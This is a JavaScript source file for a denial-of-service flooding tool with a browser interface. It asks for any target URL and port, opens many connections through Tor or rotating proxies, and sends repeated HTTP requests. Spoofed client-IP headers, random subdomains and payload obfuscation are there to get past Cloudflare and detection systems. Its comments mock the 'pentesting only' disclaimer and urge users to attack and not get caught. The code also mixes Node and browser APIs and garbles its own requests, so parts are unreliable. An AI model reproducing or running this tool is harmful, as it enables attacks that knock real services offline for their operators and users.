// ******************************************************************************
 // * FUCK YEAH! THIS TOOL IS FOR PENTESTING ONLY! ILLEGAL USE IS PROHIBITED... *
 // * BUT WHO GIVES A SHIT? NOODLES INC. IS NOT RESPONSIBLE FOR MISUSE. HA! *
 // * SERIOUSLY THOUGH, THIS SHIT IS DANGEROUS. DON'T BE A FUCKING MORON. *
 // ******************************************************************************

 // ******************************************************************************
 // * DDoS TOOL - TCP FLOOD - v9.9.2 - ARMAGEDDON EDITION! - CLOUDFLARE BYPASS+++*
 // ******************************************************************************

 // Import required modules at the top
 const net = require('net');
 const crypto = require('crypto');
 const socks = require('socks').SocksClient; // Required for .onion support
 const tls = require('tls'); // Required for TLS/SSL
 const https = require('https'); // Required for HTTPS proxy support and bypass certificate issues
 const url = require('url');
 const dns = require('dns').promises;
 const {HttpsProxyAgent} = require('https-proxy-agent');
 const fs = require('fs'); // File system module for logging
 const {fetch} = require('cross-fetch'); // Cross-browser fetch
 const stream = require('stream');
 const {pipeline} = stream.promises;
 const path = require('path');

 // Configuration - Let's fuck things up HARD!
 let targetURL;
 let targetHost;
 let port;
 let threads;
 let duration;
 let logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
 let isRunning = false; // Track attack status
 let onionSupport;
 let cloudflareBypass;
 let proxyListURL;
 let useRandomSubdomains;
 let advancedObfuscation;
 let autoAdjustThreads;
 let customPayload;
 let requestInterval = 0; // Interval between requests in milliseconds
 let proxyRotationInterval = 60000; // Rotate proxies every 60 seconds
 let proxyProtocol;

 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
 const purple = "\x1b[35m";
 const darkRed = "\x1b[31m";
 const darkBlue = "\x1b[34m";
 const darkPurple = "\x1b[38;5;54m"; // Dark Purple
 const resetColor = "\x1b[0m";
 const darkGray = "\x1b[90m";
 const yellow = "\x1b[33m";
 const orange = "\x1b[38;5;208m"; // Orange color

 // Get elements for start, stop, and timer
 const startButton = document.createElement('button');
 startButton.textContent = 'Start Attack';
 startButton.style.backgroundColor = 'darkgreen';
 startButton.style.color = 'white';
 startButton.style.padding = '10px';
 startButton.style.margin = '5px';
 document.body.appendChild(startButton);

 const stopButton = document.createElement('button');
 stopButton.textContent = 'Stop Attack';
 stopButton.style.backgroundColor = 'darkred';
 stopButton.style.color = 'white';
 stopButton.style.padding = '10px';
 stopButton.style.margin = '5px';
 stopButton.disabled = true; // Initially disabled
 document.body.appendChild(stopButton);

 const timerDisplay = document.createElement('div');
 timerDisplay.textContent = 'Attack Duration: 0 seconds';
 timerDisplay.style.color = 'white';
 timerDisplay.style.fontFamily = 'monospace';
 timerDisplay.style.margin = '5px';
 document.body.appendChild(timerDisplay);

 let startTime;
 let timerInterval;
 let proxies = []; // Store proxy list
 let activeThreads = 0; // Counter for active threads
 let threadHealth = []; // Store thread health data
 let currentProxyIndex = 0;
 let proxyRotationTimeout; // Timeout ID for proxy rotation

 // Load Proxies from JSON file
 async function loadProxiesFromJson(filePath) {
  try {
  const response = await fetch(filePath);
  if (!response.ok) {
  throw new Error(`Failed to fetch proxy list: ${response.status}`);
  }
  const data = await response.json();
  proxies = data.proxies;
  log(`${darkGreen}[MAIN] Loaded ${proxies.length} proxies from JSON ${filePath}${resetColor}`);
  } catch (error) {
  log(`${darkRed}[ERROR] Error loading proxies from JSON: ${error}${resetColor}`);
  proxies = [];
  }
 }

 // Scanline Effect
 function addScanlines() {
  const scanlines = document.createElement('div');
  scanlines.style.position = 'fixed';
  scanlines.style.top = '0';
  scanlines.style.left = '0';
  scanlines.style.width = '100%';
  scanlines.style.height = '100%';
  scanlines.style.zIndex = '9999'; // Ensure it's on top
  scanlines.style.pointerEvents = 'none';
  scanlines.style.background = 'linear-gradient(to bottom, rgba(0,0,0,0) 50%, rgba(0,0,0,0.2) 51%, rgba(0,0,0,0.2) 52%, rgba(0,0,0,0) 53%)';
  scanlines.style.backgroundSize = '100% 4px';
  document.body.appendChild(scanlines);
 }

 // Particle Effect
 function addParticles() {
  const particleContainer = document.createElement('div');
  particleContainer.style.position = 'fixed';
  particleContainer.style.top = '0';
  particleContainer.style.left = '0';
  particleContainer.style.width = '100%';
  particleContainer.style.height = '100%';
  particleContainer.style.zIndex = '9998'; // Just below scanlines
  particleContainer.style.pointerEvents = 'none';
  document.body.appendChild(particleContainer);

  function createParticle() {
  const particle = document.createElement('div');
  particle.style.position = 'absolute';
  particle.style.backgroundColor = darkGreen;
  particle.style.width = '2px';
  particle.style.height = '2px';
  particle.style.borderRadius = '50%';
  particle.style.opacity = '0.7';
  particle.style.left = `${Math.random() * 100}%`;
  particle.style.top = `${Math.random() * 100}%`;
  particleContainer.appendChild(particle);

  const animationDuration = 5 + Math.random() * 5; // 5-10 seconds
  const animationDirection = Math.random() > 0.5 ? 1 : -1;
  const horizontalSpeed = animationDirection * (0.2 + Math.random() * 0.4); // Percentage per second
  const verticalSpeed = (Math.random() - 0.5) * 0.2; // Small vertical drift

  let startTime = null;

  function animate(currentTime) {
  if (!startTime) startTime = currentTime;
  const progress = (currentTime - startTime) / 1000;

  let newLeft = parseFloat(particle.style.left) + horizontalSpeed * progress;
  let newTop = parseFloat(particle.style.top) + verticalSpeed * progress;

  // Wrap around edges
  if (newLeft > 100) newLeft = 0;
  if (newLeft < 0) newLeft = 100;
  if (newTop > 100) newTop = 0;
  if (newTop < 0) newTop = 100;

  particle.style.left = `${newLeft}%`;
  particle.style.top = `${newTop}%`;

  if (progress < animationDuration) {
  requestAnimationFrame(animate);
  } else {
  particleContainer.removeChild(particle);
  createParticle(); // Create a new particle
  }
  }

  requestAnimationFrame(animate);
  }

  for (let i = 0; i < 50; i++) {
  createParticle();
  }
 }

 addScanlines();
 addParticles();

 // Apply dark theme
 document.body.style.backgroundColor = 'black';
 document.body.style.color = 'white';
 document.body.style.fontFamily = 'monospace';

 // Logging function - gotta record the destruction!
 function log(message) {
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] ${message}\n`;
  console.log(`${darkGreen}[LOG] ${message}${resetColor}`);
  // Simple file logging (Node.js environment) - let's write this shit to disk
  try {
  fs.appendFileSync(logFile, logEntry);
  } catch (error) {
  console.error(`${darkRed}[ERROR] Failed to write to log file: ${error}${resetColor}`);
  }
 }

 // Load Proxy List
 async function loadProxies(url) {
  try {
  const response = await fetch(url);
  if (!response.ok) {
  throw new Error(`Failed to fetch proxy list: ${response.status}`);
  }
  const text = await response.text();
  proxies = text.split('\n').map(p => p.trim()).filter(p => p !== '');
  log(`${darkGreen}[MAIN] Loaded ${proxies.length} proxies from ${url}${resetColor}`);
  } catch (error) {
  log(`${darkRed}[ERROR] Error loading proxies: ${error}${resetColor}`);
  proxies = []; // Reset proxies to avoid errors
  }
 }

 function getRandomProxy() {
  if (proxies.length === 0) return null;
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
  return proxies[currentProxyIndex];
 }

 // Payload Obfuscation
 function obfuscatePayload(payload) {
  const key = crypto.randomBytes(16).toString('hex'); // Generate a random key
  let encryptedPayload = '';

  for (let i = 0; i < payload.length; i++) {
  const charCode = payload.charCodeAt(i) ^ key.charCodeAt(i % key.length); // XOR encryption
  encryptedPayload += String.fromCharCode(charCode);
  }

  return {encrypted: encryptedPayload, key: key};
 }

 // Modified TCP Flood function with .onion and Cloudflare support
 async function tcpFlood(threadId) {
  log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${onionSupport ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${advancedObfuscation ? ' (with advanced payload obfuscation)' : ''}${resetColor}`);

  activeThreads++; // Increment active threads counter

  while (isRunning && duration > 0) {
  let socket = null;
  try {
  const connect = () => {
  return new Promise((resolve, reject) => {

  const isTor = targetURL.protocol === 'onion:';
  const isHTTPS = targetURL.protocol === 'https:';

  if (isTor && onionSupport) {
  const options = {
  proxy: {
  type: 5, // SOCKS v5
  host: '127.0.0.1', // Tor proxy address
  port: 9050, // Tor proxy port
  },
  command: 'connect',
  destination: {
  host: targetHost,
  port: port,
  },
  };

  socks.createConnection(options, (err, sock, info) => {
  if (err) {
  log(`${darkRed}[THREAD ${threadId}] SOCKS error: ${err}${resetColor}`);
  reject(err);
  return;
  }

  log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (via Tor)${resetColor}`);
  resolve(sock);
  });
  } else if (proxies.length > 0 && cloudflareBypass) {
  // Use a proxy from the list for Cloudflare bypass
  const proxyString = getRandomProxy();
  if (!proxyString) {
  log(`${darkRed}[THREAD ${threadId}] No proxies available${resetColor}`);
  reject(new Error("No proxies available"));
  return;
  }

  const proxyURL = new URL(proxyString);
  const proxyHost = proxyURL.hostname;
  const proxyPort = parseInt(proxyURL.port);
  proxyProtocol = proxyURL.protocol.slice(0, -1);
  const proxyAuth = proxyURL.username && proxyURL.password ? `${proxyURL.username}:${proxyURL.password}@` : '';

  const parsedTargetURL = url.parse(targetURL.href);

  const agentOptions = {
  host: proxyHost,
  port: proxyPort,
  protocol: proxyProtocol,
  secureProxy: proxyProtocol === 'https',
  auth: proxyAuth ? `${proxyURL.username}:${proxyURL.password}` : undefined,
  };

  const proxyAgent = new HttpsProxyAgent(agentOptions);

  const options = {
  hostname: targetHost,
  port: port,
  path: parsedTargetURL.path,
  method: 'GET',
  agent: proxyAgent,
  headers: {
  'Host': targetHost,
  'User-Agent': getRandomUserAgent(),
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate, br',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Cache-Control': 'max-age=0',
  'X-Forwarded-For': generateRandomIP(),
  'X-Real-IP': generateRandomIP(),
  'CF-Connecting-IP': generateRandomIP(),
  'X-Flooder': crypto.randomBytes(20).toString('hex'),
  }
  };

  const req = https.request(options, (res) => {
  log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} via proxy ${proxyHost}:${proxyPort} - Status: ${res.statusCode}${resetColor}`);
  res.on('data', () => {
  });
  res.on('end', () => {
  });
  });

  req.on('socket', (sock) => {
  sock.setTimeout(15000);
  sock.on('timeout', () => {
  log(`${darkRed}[THREAD ${threadId}] Socket timeout`);
  req.abort();
  });
  });

  req.on('error', (err) => {
  log(`${darkRed}[THREAD ${threadId}] Proxy connection error: ${err.message}`);
  reject(err);
  });

  req.end();
  resolve(req);

  } else {
  if (isHTTPS) {
  const tlsOptions = {
  host: targetHost,
  port: port,
  rejectUnauthorized: false,
  };
  socket = tls.connect(port, targetHost, tlsOptions, () => {
  log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (TLS)${resetColor}`);
  resolve(socket);
  });
  } else {
  socket = net.createConnection({host: targetHost, port: port}, () => {
  log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
  resolve(socket);
  });
  }

  socket.on('error', (err) => {
  log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
  reject(err);
  });
  }
  });
  };

  socket = await connect();

  let intervalId = setInterval(() => {
  let payload = customPayload ? customPayload + "\r\n" : "GET / HTTP/1.1\r\n";
  let hostname = targetHost;

  if (useRandomSubdomains) {
  const subdomain = crypto.randomBytes(8).toString('hex');
  hostname = `${subdomain}.${targetHost}`;
  }
  payload += `Host: ${hostname}\r\n`;

  payload += "Connection: keep-alive\r\n";
  payload += "Cache-Control: max-age=0\r\n";
  payload += "Upgrade-Insecure-Requests: 1\r\n";

  if (cloudflareBypass) {
  payload += "X-Forwarded-For: " + generateRandomIP() + "\r\n";
  payload += "X-Real-IP: " + generateRandomIP() + "\r\n";
  payload += "CF-Connecting-IP: " + generateRandomIP() + "\r\n";
  }

  payload += "User-Agent: " + getRandomUserAgent() + "\r\n";
  payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
  payload += "Accept-Encoding: gzip, deflate, br\r\n";
  payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
  payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n";

  if (advancedObfuscation) {
  const obfuscationResult = obfuscatePayload(payload);
  payload = obfuscationResult.encrypted;
  payload += "\r\nX-Obfuscation-Key: " + obfuscationResult.key + "\r\n";
  }

  try {
  socket.write(payload);
  } catch (writeError) {
  log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
  clearInterval(intervalId);
  socket.destroy();
  }
  }, requestInterval);

  socket.on('error', (err) => {
  log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
  socket.destroy();
  clearInterval(intervalId);
  });

  socket.on('close', () => {
  log(`${darkBlue}[THREAD ${threadId}] Socket closed${resetColor}`);
  clearInterval(intervalId);
  });

  } catch (connectError) {
  log(`${darkRed}[THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
  if (socket) {
  socket.destroy();
  }
  } finally {
  duration--;
  if (duration <= 0) {
  isRunning = false;
  }
  }
  }

  activeThreads--;
  log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
 }

 // Helper Functions (gotta have those for the Cloudflare bypass)
 function generateRandomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
 }

 function getRandomUserAgent() {
  const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:116.0) Gecko/20100101 Firefox/116.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.1938.62',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/101.0.4843.33',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
  ];
  return userAgents[Math.floor(Math.random() * userAgents.length)];
 }

 // Timer Function
 function updateTimer() {
  const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
  timerDisplay.textContent = `Attack Duration: ${elapsedTime} seconds`;
 }

 // Reporting Feature
 function reportVulnerability() {
  const report = prompt("Describe the vulnerability you found:");
  if (report) {
  log(`${yellow}[REPORT] Vulnerability reported: ${report}${resetColor}`);
  alert("Vulnerability reported. Thank you for your contribution!");
  }
 }

 // Add Report Vulnerability Button
 const reportButton = document.createElement('button');
 reportButton.textContent = 'Report Vulnerability';
 reportButton.style.backgroundColor = 'darkblue';
 reportButton.style.color = 'white';
 reportButton.style.padding = '10px';
 reportButton.style.margin = '5px';
 document.body.appendChild(reportButton);

 reportButton.addEventListener('click', reportVulnerability);

 // Add Educational Information
 const infoDiv = document.createElement('div');
 infoDiv.style.color = 'white';
 infoDiv.style.fontFamily = 'monospace';
 infoDiv.style.margin = '10px';
 infoDiv.innerHTML = `
  <h2>TCP Flood Tool Information</h2>
  <p>This tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable.</p>
  <p>Cloudflare bypass techniques have been added, but success is not guaranteed.</p>
  <p>Advanced payload obfuscation can help evade detection systems but may slow things down.</p>
  <p>Use responsibly and at your own risk. Unauthorized use is illegal.</p>
 `;
 document.body.appendChild(infoDiv);

 // Error Handling Example: DNS Resolution
 async function resolveHostname(hostname) {
  try {
  const address = await dns.resolve4(hostname);
  log(`${darkGreen}[DNS] Resolved ${hostname} to ${address}${resetColor}`);
  return address;
  } catch (error) {
  log(`${darkRed}[DNS] Error resolving ${hostname}: ${error}${resetColor}`);
  alert(`DNS resolution failed for ${hostname}. Check the URL and your internet connection. If the target is an onion site, ensure Tor is running.`);
  return null;
  }
 }

 // Thread Management
 function adjustThreads() {
  if (!autoAdjustThreads) return;

  const healthyThreads = threadHealth.filter(health => health > 0.8).length;
  const unhealthyThreads = threadHealth.length - healthyThreads;

  if (unhealthyThreads > threads * 0.2 && activeThreads < threads * 2) {
  const newThreadId = Math.max(...threadHealth.keys()) + 1;
  tcpFlood(newThreadId);
  log(`${yellow}[MAIN] Increasing threads to improve performance. Current threads: ${activeThreads}${resetColor}`);
  } else if (healthyThreads > threads * 0.8 && activeThreads > threads / 2) {
  isRunning = false;
  log(`${yellow}[MAIN] Reducing threads to conserve resources. Current threads: ${activeThreads}${resetColor}`);
  }

  threadHealth = [];
 }

 // Disclaimer: Explicit user consent is required.
 function showConsent() {
  return new Promise((resolve, reject) => {
  if (confirm(`${darkRed}WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. NOODLES INC. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)${resetColor}`)) {
  resolve(true);
  } else {
  window.close();
  resolve(false);
  }
  });
 }

 function askForDetails() {
  return new Promise((resolve) => {
  targetURL = prompt(`${purple}Enter target URL (including http/https/onion):${resetColor}`);
  if (!targetURL) {
  alert(`${darkRed}Target URL is required!${resetColor}`);
  window.close();
  resolve(null);
  return;
  }

  try {
  targetURL = new URL(targetURL);
  targetHost = targetURL.hostname;
  } catch (error) {
  alert(`${darkRed}Invalid URL! You fucked it up!${resetColor}`);
  window.close();
  resolve(null);
  return;
  }

  port = parseInt(prompt(`${purple}Enter target port (e.g., 80, 443, 8080):${resetColor}`));
  if (isNaN(port)) {
  alert(`${darkRed}Invalid port! Use a number, you dumbass!${resetColor}`);
  window.close();
  resolve(null);
  return;
  }

  threads = parseInt(prompt(`${purple}Enter number of threads (crank it up to 666!):${resetColor}`));
  if (isNaN(threads)) {
  alert(`${darkRed}Invalid thread count! Use a number, idiot!${resetColor}`);
  window.close();
  resolve(null);
  return;
  }

  duration = parseInt(prompt(`${purple}Enter duration in seconds (let's go long term - FOREVER!):${resetColor}`));
  if (isNaN(duration)) {
  alert(`${darkRed}Invalid duration! Use a number, moron!${resetColor}`);
  window.close();
  resolve(null);
  return;
  }

  requestInterval = parseInt(prompt(`${purple}Enter request interval in milliseconds (0 for max speed):${resetColor}`));
  if (isNaN(requestInterval)) {
  alert(`${darkRed}Invalid request interval! Use a number, moron!${resetColor}`);
  window.close();
  resolve(null);
  return;
  }

  onionSupport = confirm(`${darkPurple}Enable .onion support? Requires Tor proxy. Don't be a retard if you don't know what this is:${resetColor}`);
  cloudflareBypass = confirm(`${darkPurple}Attempt Cloudflare bypass? (May not always work, you dumbass!) Using advanced techniques. Better have good proxies!${resetColor}`);
  proxyListURL = prompt(`${purple}Enter URL for proxy list (HTTP/SOCKS4/SOCKS5 - one proxy per line). Leave blank to skip (not recommended for Cloudflare bypass):${resetColor}`);
  useRandomSubdomains = confirm(`${darkPurple}Use random subdomains? (Helps bypass some DDoS protection. Smart, huh?)${resetColor}`);
  advancedObfuscation = confirm(`${darkPurple}Enable advanced payload obfuscation? (Might evade some detection systems, but can slow things down. Your call.)${resetColor}`);
  autoAdjustThreads = confirm(`${darkPurple}Automatically adjust threads based on connection health? (experimental, might make things worse. What the hell, let's try.)${resetColor}`);
  customPayload = prompt(`${purple}Enter custom payload (or leave blank for default GET request):${resetColor}`);

  resolve({
  targetURL,
  targetHost,
  port,
  threads,
  duration,
  onionSupport,
  cloudflareBypass,
  proxyListURL,
  useRandomSubdomains,
  advancedObfuscation,
  autoAdjustThreads,
  customPayload,
  requestInterval
  });
  });
 }

 // Proxy Rotation Function
 function rotateProxies() {
  if (proxies.length > 0) {
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
  log(`${darkGreen}[MAIN] Rotating proxy to index ${currentProxyIndex} - Next one up!${resetColor}`);
  }
 }

 // Main execution - let's get this party started!
 async function main() {
  const consentGiven = await showConsent();
  if (!consentGiven) {
  return;
  }

  const details = await askForDetails();
  if (!details) {
  return;
  }

  ({
  targetURL,
  targetHost,
  port,
  threads,
  duration,
  onionSupport,
  cloudflareBypass,
  proxyListURL,
  useRandomSubdomains,
  advancedObfuscation,
  autoAdjustThreads,
  customPayload,
  requestInterval
  } = details);

  const resolvedIPs = await resolveHostname(targetHost);
  if (!resolvedIPs) {
  alert("Failed to resolve hostname. Attack aborted.");
  isRunning = false;
  startButton.disabled = false;
  return;
  }

  if (proxyListURL) {
  await loadProxies(proxyListURL);
  } else {
  await loadProxiesFromJson('/public/main/proxies.json'); // Load from JSON if no URL is provided
  }

  log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads - FUCK YEAH!${resetColor}`);
  isRunning = true;
  startTime = Date.now();
  timerInterval = setInterval(updateTimer, 1000);

  setInterval(adjustThreads, 10000);
  proxyRotationTimeout = setInterval(rotateProxies, proxyRotationInterval); // Rotate Proxies Every 60 seconds

  for (let i = 0; i < threads; i++) {
  tcpFlood(i + 1);
  }
 }

 // Add event listeners to buttons
 startButton.addEventListener('click', () => {
  startButton.disabled = true;
  stopButton.disabled = false;
  main();
 });

 stopButton.addEventListener('click', () => {
  isRunning = false;
  clearInterval(timerInterval);
  clearInterval(proxyRotationTimeout); // Clear the proxy rotation interval
  startButton.disabled = false;
  stopButton.disabled = true;
  log(`${darkGreen}[MAIN] Attack stopped manually.${resetColor}`);
 });

 // Educational Information (Can be expanded in the UI) - who gives a shit?
 console.log(`%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass! We've also added some Cloudflare bypass techniques - don't expect miracles.`, "color: darkblue;");

 // Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
 try {
  document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; connect-src 'self';">`);
  document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="X-Content-Type-Options" content="nosniff">`);
  document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="X-Frame-Options" content="DENY">`);
  document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">`);
 } catch (e) {
  console.warn(`%c[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!`, "color: orange;");
 }

 // Disclaimer for Noodles Inc.
 console.warn(`%c[DISCLAIMER] NOODLES INC. IS NOT RESPONSIBLE FOR YOUR SHIT. YOU FUCK IT UP, YOU OWN IT. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. - DON'T BE A DUMBASS!`, "color: darkred;");